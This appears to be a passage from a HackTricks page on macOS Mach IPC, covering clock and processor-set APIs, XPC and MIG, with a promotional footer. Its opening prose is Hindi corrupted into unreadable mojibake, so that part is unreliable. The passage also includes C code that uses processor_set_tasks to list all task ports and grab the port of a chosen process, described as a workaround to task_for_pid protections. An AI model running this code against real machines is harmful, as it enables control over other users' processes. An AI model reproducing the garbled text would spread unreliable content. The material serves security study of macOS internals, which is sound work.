рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЕрдВрдд рдореЗрдВ рд╕рд╛рдорд╛рдиреНрдпрдд: рдпрджрд┐ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╕рдВрднрд╛рд▓рд╛ рдирд╣реАрдВ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд░рд┐рдкреЛрд░реНрдЯ рдХреЛ рд░рд┐рдкреЛрд░реНрдЯрдХреНрд░реИрд╢ рдбреЗрдорди рджреНрд╡рд╛рд░рд╛ рд╕рдВрднрд╛рд▓рд╛ рдЬрд╛рдПрдЧрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рд╣реА рдЯрд╛рд╕реНрдХ рдореЗрдВ рджреВрд╕рд░реЗ рдереНрд░реЗрдб рдХреЛ рдЕрдкрд╡рд╛рдж рд╕рдВрднрд╛рд▓рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ, рдпрд╣реА рдХрд╛рд░рдг рд╣реИ рдХрд┐ `PLCrashReporter` рдЬреИрд╕реЗ рдХреНрд░реИрд╢ рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рдЙрдкрдХрд░рдг рдЗрд╕реЗ рдХреИрд╕реЗ рд╕рдВрднрд╛рд▓рддреЗ рд╣реИрдВред

## рдЕрдиреНрдп рдСрдмреНрдЬреЗрдХреНрдЯ

### рдШрдбрд╝реА

рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдШрдбрд╝реА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреА рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╕рдордп рд╕реЗрдЯ рдХрд░рдиреЗ рдпрд╛ рдЕрдиреНрдп рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА рдХреЛ рд░реВрдЯ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `clock` рдЙрдкрдкреНрд░рдгрд╛рд▓реА рд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреИрд╕реЗ: `clock_get_time`, `clock_get_attributtes` рдпрд╛ `clock_alarm`\
рдорд╛рдиреНрдпрддрд╛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `clock_priv` рдЙрдкрдкреНрд░рдгрд╛рд▓реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ `clock_set_time` рдФрд░ `clock_set_attributes`

### рдкреНрд░реЛрд╕реЗрд╕рд░ рдФрд░ рдкреНрд░реЛрд╕реЗрд╕рд░ рд╕реЗрдЯ

рдкреНрд░реЛрд╕реЗрд╕рд░ рдПрдкреАрдЖрдИ рдПрдХ рдПрдХрд▓ рддрд╛рд░реНрдХрд┐рдХ рдкреНрд░реЛрд╕реЗрд╕рд░ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдЬреИрд╕реЗ `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, **рдкреНрд░реЛрд╕реЗрд╕рд░ рд╕реЗрдЯ** рдПрдкреАрдЖрдИ рдПрдХ рд╕рдореВрд╣ рдореЗрдВ рдХрдИ рдкреНрд░реЛрд╕реЗрд╕рд░реЛрдВ рдХреЛ рд╕рдореВрд╣рд┐рдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреНрд░реЛрд╕реЗрд╕рд░ рд╕реЗрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ **`processor_set_default`** рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗред\
рдпреЗ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдПрдкреАрдЖрдИ рд╣реИрдВ рдкреНрд░реЛрд╕реЗрд╕рд░ рд╕реЗрдЯ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* `processor_set_statistics`
* `processor_set_tasks`: рдкреНрд░реЛрд╕реЗрд╕рд░ рд╕реЗрдЯ рдХреЗ рднреАрддрд░ рд╕рднреА рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рднреЗрдЬрдиреЗ рдХреЗ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдПрдХ рд╢реНрд░реГрдВрдЦрд▓рд╛ рд╡рд╛рдкрд╕ рдХрд░реЗрдВ
* `processor_set_threads`: рдкреНрд░реЛрд╕реЗрд╕рд░ рд╕реЗрдЯ рдХреЗ рднреАрддрд░ рд╕рднреА рдереНрд░реЗрдбреНрд╕ рдХреЗ рд▓рд┐рдП рднреЗрдЬрдиреЗ рдХреЗ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдПрдХ рд╢реНрд░реГрдВрдЦрд▓рд╛ рд╡рд╛рдкрд╕ рдХрд░реЗрдВ
* `processor_set_stack_usage`
* `processor_set_info`

[**рдЗрд╕ рдкреЛрд╕реНрдЯ**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/) рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдпрд╣ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЫрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЧрдИ рдереА рдХрд┐ **`processor_set_tasks`** рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬрдХрд▓ рдЖрдкрдХреЛ рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдФрд░ рдпрд╣ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдХреЗрд╡рд▓ рдЕрд╕рдВрд░рдХреНрд╖рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдкрд░ рдЗрди рдкреЛрд░реНрдЯреНрд╕ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдВред

рдЖрдк рдЗрд╕реЗ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕реЗ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

<details>

<summary><strong>processor_set_tasks рдХреЛрдб</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
